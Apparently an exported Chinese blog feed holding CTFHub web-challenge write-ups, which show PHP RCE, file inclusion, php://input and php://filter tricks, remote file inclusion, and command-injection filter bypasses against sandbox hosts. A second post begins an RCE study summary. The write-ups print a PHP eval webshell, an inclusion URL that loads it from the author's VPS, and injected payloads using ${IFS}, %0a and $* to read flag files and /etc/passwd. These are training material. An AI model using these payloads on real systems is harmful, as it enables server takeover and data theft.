class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span>                  <span class="hljs-comment">#切换目录</span><br> <br><span class="hljs-built_in">ls</span>                   <span class="hljs-comment">#显示当前目录下的文件</span><br> <br>ifconfig              <span class="hljs-comment">#查看IP地址</span><br> <br><span class="hljs-built_in">cat</span> /etc/passwd       <span class="hljs-comment">#查看password文件内容</span><br> <br><span class="hljs-built_in">id</span>                  <span class="hljs-comment">#查看当前用户的id号</span><br> <br><span class="hljs-built_in">cat</span> /etc/group        <span class="hljs-comment">#查看用户组文件内容</span><br> <br><span class="hljs-built_in">pwd</span>                <span class="hljs-comment">#显示当前目录</span><br> <br><span class="hljs-built_in">uname</span> -a            <span class="hljs-comment">#查看当前系统版本</span><br> <br>natstat -pantu        <span class="hljs-comment">#查看当前服务器的端口信息</span><br> <br>netstat -nr           <span class="hljs-comment">#查看网关和路由</span><br></code></pre></td></tr></table></figure><p>出来路径了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">4668</span>abfa65cec5c5.sandbox.ctfhub.com:<span class="hljs-number">10800</span>?cmd=system(<span class="hljs-string">&quot;pwd&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921579.png"></p><p>继续尝试，我们列一下根目录的文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">4668</span>abfa65cec5c5.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?cmd=system(%<span class="hljs-number">22</span>ls%<span class="hljs-number">20</span>/%<span class="hljs-number">22</span>);<br></code></pre></td></tr></table></figure><p>出来了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921698.png"></p><p>我们打开根目录下的这个文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">4668</span>abfa65cec5c5.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?cmd=system(%<span class="hljs-number">22</span>cat%<span class="hljs-number">20</span>/flag_26944%<span class="hljs-number">22</span>);<br></code></pre></td></tr></table></figure><p>出Flag了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921119.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>还是代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921185.png"></p><p>不过有个shell，我们看一下。</p><p>发现还是一句话木马</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921864.png"></p><p>我们先来看一下那段代码是什么意思</p><p><code>error\_reporting(0);</code> ：关闭所有错误报告。error_reporting() 函数用于设置 PHP 错误报告的级别，传递 0 作为参数将关闭所有错误报告。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922425.png"></p><p><code>strpos($_GET[&quot;file&quot;], &quot;flag&quot;)</code>：返回”flag”在$_GET[“file”]中第一次出现的位置，如果“flag“不存在，则返回false。</p><p>注意前面又加了！，那就是如果“flag“不存在，则返回true。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922803.png"></p><p>实际上就是检测我们传的参数带不带“flag“，带的话就会说我们是黑客</p><p>比如我们输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">1</span>e934472c975c88d.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?file=%<span class="hljs-number">22</span>flag%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922238.png"></p><p>不带的话，就包含文件，文件名我们传递file的值。</p><p>那肯定要包含shell.txt，并且连接蚁剑</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://challenge-<span class="hljs-number">1</span>e934472c975c88d.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">shell</span>.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922614.png"></p><p>还是在根目录下找到flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922076.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922925.png"></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>还是审计代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922428.png"></p><p>issert()函数用来检测$_GET[‘file’]是否为空，substr($_GET[“file”], 0, 6)是取出前6个字符，然后判断是否为”php:&#x2F;&#x2F;”，如果是，就会<code>include($_GET[&quot;file&quot;]);</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922360.png"></p><p>看题目很明显要求我们用到伪协议的<code>php://input</code>，</p><p><strong><code>php://input</code></strong></p><p>作用：可用于查看源码，同时是要查看未压缩文件的只读流。在post请求中能查看请求的原始数据，<strong>并将post请求中的post数据当作php代码执行。</strong>（只读流是说只能进行读操作的数据）</p><p>条件：<code>allow_url_fopen=off/on；allow_url_include=on</code></p><p>点击题中的 phpinfor 查看php情况，检查<code>allow_url_include</code>是否为on</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922940.png"></p><p>可以看到已经开了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922479.png"></p><p>然后我们就用POST传参，别忘了传递参数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure><p>POST传递的数据为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>):<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922118.png"></p><p>出flag位置了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922769.png"></p><p>然后还是POST传参，加上<code>?file=php://input</code></p><p>POST传递的数据为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag_541&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里还是要修改成大家自己的flag位置。</p><p>确保无误后放包，出flag</p><h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>代码和之前相似</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922490.png"></p><p>还是尝试<code>php://input</code>，发现失败了，估计是<code>allow_url_include=off</code>的问题</p><p>但是在php伪协议中还存在：<code>php://filter</code></p><p><strong><code>php://filter</code></strong></p><ul><li>条件：<code>allow_url_fopen=off/on；allow_url_include=off/on</code></li><li>作用：用过滤器读写数据流</li></ul><p>可以发现，<code>php://filter</code>相当于没有条件</p><p>接下来我们进一步了解<code>php://filter</code>，其具有四个参数：</p><table><thead><tr><th>名称</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td><code>resource=&lt;要过滤的数据流&gt;</code></td><td>指定了你要筛选过滤的数据流。</td><td>必选</td></tr><tr><td><code>read=&lt;读链的筛选列表&gt;</code></td><td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td><td></td></tr><tr><td><code>write=&lt;写链的筛选列表&gt;</code></td><td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td><td></td></tr><tr><td><code>&lt;;两个链的筛选列表&gt;</code></td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table><p>这道题就直接构造payload了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span>resource=/flag<br></code></pre></td></tr></table></figure><p>Flag出来了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922503.png"></p><p>有些比赛赛题情况下还要用base64输出</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span><span class="hljs-keyword">read</span>=convert.base64-encode<span class="hljs-regexp">/resource=/</span>flag<br></code></pre></td></tr></table></figure><h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>代码和之前类似</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923523.png"></p><p>看看phpinfo</p><p><code>allow_url_fopen= on；allow_url_include= on</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923075.png"></p><p>可以用伪协议php:&#x2F;&#x2F;input</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923337.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923819.png"></p><p>但按题目看，这里是用远程包含。</p><p>HP的配置选项<code>allow_url_include</code>为<strong>ON</strong>的话，则include&#x2F;require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(<strong>R</strong>emote <strong>F</strong>ile <strong>I</strong>nclusion，即RFI)”。</p><p><code>allow_url_fopen = On</code> 是否允许打开远程文件；<code>allow_url_include = On</code> 是否允许include&#x2F;require远程文件。</p><p>在服务器中mkdir一个文件夹，然后在文件夹里vi一个webshell_post.txt</p><p>编辑一个一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>随后用python启动一个http服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>然后用蚁剑连接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-b9152779869a03e5.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?file=http:/</span><span class="hljs-regexp">/你的vps地址:8080/</span>webshell_post.txt<br></code></pre></td></tr></table></figure><p>这样就会包含我们的文件，即包含我们的一句话木马，蚁剑成功连接。</p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>还是看看代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923085.png"></p><p>上面那个提交框输入的是ip</p><p>然后发送了之后会通过exec函数执行命令</p><p>最后显示执行的命令。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923290.png"></p><p>需要详细了解各种管道符的请看总结：<a href="https://blog.csdn.net/2302_81178149/article/details/145461296" title="RCE学习总结-CSDN博客">RCE学习总结-CSDN博客</a></p><p>这道题没有过滤，那我们直接试试&amp;</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;whoami<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923793.png"></p><p>返回数据了，回显www-data说明whoami执行成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924987.png"></p><p>列一下当前目录试试</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923840.png"></p><p>15120590614198.php有些可疑，看一下它</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat <span class="hljs-number">15120590614198</span>.php<br></code></pre></td></tr></table></figure><p>没回显</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923379.png"></p><p>一般遇见这种情况 咱们首先考虑两种方法</p><p>第一种，直接查看源代码</p><p>果不其然 直接在源代码中找到了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923208.png"></p><p>第二种方法是将文件内容base64编码出来</p><p>提交payload</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat <span class="hljs-number">15120590614198</span>.php| base64<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923318.png"></p><p>然后解码即可</p><h2 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h2><p>这一关看题目应该是过滤cat</p><p>在linux下，不只有cat 可以读取文件内容，more、less、head、tac，都可以对文本进行读取。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923536.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp; more flag_2628015623637.php<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp; more flag_2628015623637.php | base64 <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923740.png"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>这题很明显是过滤空格，</p><p>空格可以用以下字符串代替：</p><p><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</code>等</p><p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><p>接下来我们开始做题</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923242.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;cat$IFS$9flag_203181716426702.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923198.png"></p><p>还是查看源代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923528.png"></p><h2 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h2><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923046.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&amp;ls<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923498.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;cd flag_is_here&amp;&amp;ls<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923218.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;cd flag_is_here&amp;&amp;cat flag_19538361312761.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924621.png"></p><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>题目说过滤了几个运算符，但没过滤<code>;</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924233.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;ls<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924497.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;cat flag_948825225138.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924525.png"></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>过滤运算符、过滤目录分隔符、过滤反斜杠、过滤空格、过滤封号、过滤cat、过滤关键字flag和ctfhub</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924833.png"></p><p>先我们要使用ls列目录，发现这里过滤了运算符，连;也过滤了，绕过的方式有%0a、%0d、%0D%0A</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>%0als#<br></code></pre></td></tr></table></figure><p>注意是在URL上写</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924499.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924234.png"></p><p>我们使用ls flag_is_here列出子目录的文件，免不了绕过空格和flag的顾虑，绕过空格前面已经有writeup中附带了相关技巧，我们这里可以使用<code>$&#123;IFS&#125;</code>绕过</p><p>绕过flag关键字，我们使用的方法也是多种多样，这里不一一列出了，经过尝试可以使用$*来绕过关键字过滤，如fl$*ag_is_here</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>%0als$&#123;IFS&#125;fl$*ag_is_here<br></code></pre></td></tr></table></figure><p>也是在URL上写</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924271.png"></p><p>最后组合一下，用more替代cat</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>Acd<span class="hljs-variable">$&#123;IFS&#125;</span>fl$*ag_is_here%<span class="hljs-number">0</span>Amore<span class="hljs-variable">$&#123;IFS&#125;</span>fl$*ag_392220718908.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924685.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE学习总结</title>
    <link href="/2025/05/04/RCE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/04/RCE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145461296?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145461296?spm=1001.2014.3001.5501</a></p></blockquote><p>我们下面进行下一个漏洞——RCE的学习。RCE是常见漏洞之一，是Web安全必学漏洞，在CTF赛题中经常出现。</p><p>我们用一张图简述本文的内容：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505041652694.png"></p><h2 id="什么是RCE？"><a href="#什么是RCE？" class="headerlink" title="什么是RCE？"></a>什么是RCE？</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>RCE主要指远程代码执行和远程命令执行，CTFHub中将文件包含漏洞也看作RCE漏洞。</p><h3 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h3><p>一、远程命令执行</p><p>二、远程代码执行</p><p>三、文件包含漏洞</p><p>实际上，RCE主要是remote code execute（远程代码执行）和remote command execute（远程命令执行）的缩写，但有时把文件包含漏洞也归为其中。</p><h3 id="命令执行和代码执行的联系及区别"><a href="#命令执行和代码执行的联系及区别" class="headerlink" title="命令执行和代码执行的联系及区别"></a>命令执行和代码执行的联系及区别</h3><p>这两者的区别主要在于命令执行是调用操作系统命令进行执行，而代码执行是调用服务器网站的代码进行执行。</p><p>但代码执行在利用过程中往往会通过调用网站代码去执行系统命令，两者是相互联系的，故统一归类于RCE。</p><h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>一、定义及原理</strong></p><p>远程命令执行，顾名思义就是可以远程执行系统命令。</p><p>该漏洞的出现是由于应用系统从设计上需要给用户提供指定的远程命令操作的接口，例如在防火墙的WEB界面中会存在一个故障排除功能，里面就会存在类似Ping操作的界面，若设计者未针对这类功能进行严格的控制检测，则可能导致攻击者提交恶意命令，从而控制后台，控制服务器。</p><p>简单来说，根据设计需求，有时会允许用户执行系统命令，要是不对用户的行为进行限制，用户就可以随意执行系统命令，造成危害，这就是远程命令执行。</p><p><strong>二、成因</strong></p><ul><li>代码层过滤不严</li><li>系统的漏洞造成命令注入</li><li>调用的第三方组件存在代码执行漏洞常见的命令执行函数  <ul><li>PHP：exec、shell_exec、system、passthru、popen、proc_open等</li><li>ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等</li><li>Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec等</li></ul></li></ul><p><strong>三、漏洞检测</strong></p><p>漏洞常常出现在网络设备、安全设备、自动化运维平台上面。</p><p>往往在有需求的地方，出现RCE的概率较大，这里的有需求指的是有用户执行系统命令的需求。</p><p>白盒：可以对代码进行审计。</p><p>黑盒：可以使用一些漏扫工具、公开的漏洞、手工看功能点及参数值，其中参数值主要需要看是否和相关的漏洞函数有关，若有就可以进行测试，但是可能存在加密的情况，那么还需要进行解密。</p><h3 id="常用命令执行函数"><a href="#常用命令执行函数" class="headerlink" title="常用命令执行函数"></a>常用命令执行函数</h3><p>我们这里对常见的PHP命令执行函数进行讲解。</p><p>system()：能将字符串作为OS命令执行，且返回命令执行结果；</p><p>exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</p><p>shell_exec()：能将字符串作为OS命令执行</p><p>passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</p><p>popen()：打开进程文件指针</p><p>proc_open()：与popen()类似</p><p>pcntl_exec()：在当前进程空间执行指定程序；</p><p>反引号``：反引号``内的字符串会被解析为OS命令；</p><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>一、<strong>Windows</strong></p><p>‌‌dir‌：列出目录中的文件和子目录。</p><p>例如，dir C:\\Users可以列出C盘下Users目录中的所有文件和子目录。‌</p><p>‌‌cd‌：改变当前目录。</p><p>例如，cd C:\\Windows可以将当前目录更改为C盘下的Windows目录。</p><p>‌‌copy‌：复制文件到指定位置。</p><p>例如，copy C:\\file.txt D:\\可以将C盘下的file.txt复制到D盘。</p><p>‌‌move‌：移动文件或重命名文件&#x2F;目录。</p><p>例如，move C:\\file.txt D:\\可以将C盘下的file.txt移动到D盘。</p><p>‌‌del‌：删除一个或多个文件。</p><p>例如，del C:\\file.txt可以删除C盘下的file.txt文件。</p><p>‌‌md&#x2F;mkdir‌：创建新目录。</p><p>例如，md C:\\NewFolder可以在C盘下创建一个名为NewFolder的新目录。</p><p>rd&#x2F;rmdir：删除目录。</p><p>例如，rd C:\\OldFolder可以删除C盘下的OldFolder目录。</p><p>‌‌attrib‌：显示或更改文件属性。</p><p>例如，attrib +r C:\\file.txt可以将C盘下的file.txt文件设置为只读属性。</p><p>还有‌‌<a href="https://www.baidu.com/s?wd=ren&usm=3&ie=utf-8&rsv_pq=f019cc9f001e1419&oq=Windows%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4&rsv_t=22ea71F9kLbouTxGmtxcebUD05WabEC5xTvq/uibfCWQCGofNc0ygBsSqtY&sa=re_dqa_generate" title="ren">ren</a>‌（重命名文件或目录）、‌‌type‌（显示文件内容）、‌‌<a href="https://www.baidu.com/s?wd=format&usm=3&ie=utf-8&rsv_pq=f019cc9f001e1419&oq=Windows%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4&rsv_t=2692tJNOUJs+YjYl4n69azVTUplNtQ9mlWBE9rp0XSJ6NsD7rSEPJJyu/rw&sa=re_dqa_generate" title="format">format</a>‌（格式化磁盘）。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">ping</span>        <span class="hljs-meta">#测试连通性</span><br><br>tracert      <span class="hljs-meta">#追踪路由</span><br><br>telnet       <span class="hljs-meta">#远程连接</span><br><br>ipconfig      <span class="hljs-meta">#查看ip</span><br><br>arp -a       <span class="hljs-meta">#查看路由表</span><br><br>calc         <span class="hljs-meta">#打开计算器</span><br><br>regedit      <span class="hljs-meta">#打开注册表</span><br><br>netstat -ano  <span class="hljs-meta">#查看服务器端口信息</span><br></code></pre></td></tr></table></figure><p>更多请看：<a href="https://blog.csdn.net/m0_61840987/article/details/142819342" title="Windows系统常用操作命令大全_windows常用命令-CSDN博客">Windows系统常用操作命令大全_windows常用命令-CSDN博客</a></p><p>二、<strong>Linux</strong></p><p><strong>1、文件和目录操作</strong></p><ul><li>‌<strong>cd</strong>‌：切换目录。例如，cd &#x2F;home 进入 &#x2F;home 目录。</li><li>‌<strong>pwd</strong>‌：显示当前工作目录。</li><li>‌<strong>ls</strong>‌：列出目录内容。例如，ls -l 显示详细列表。</li><li>‌<strong>mkdir</strong>‌：创建目录。例如，mkdir dir1 创建名为 dir1 的目录。</li><li>‌<strong>rmdir</strong>‌：删除空目录。</li><li>‌<strong>rm</strong>‌：删除文件或目录。例如，rm -rf dir1 递归删除 dir1 及其内容。</li><li>‌<strong>cp</strong>‌：复制文件或目录。例如，cp file1 file2 将 file1 复制为 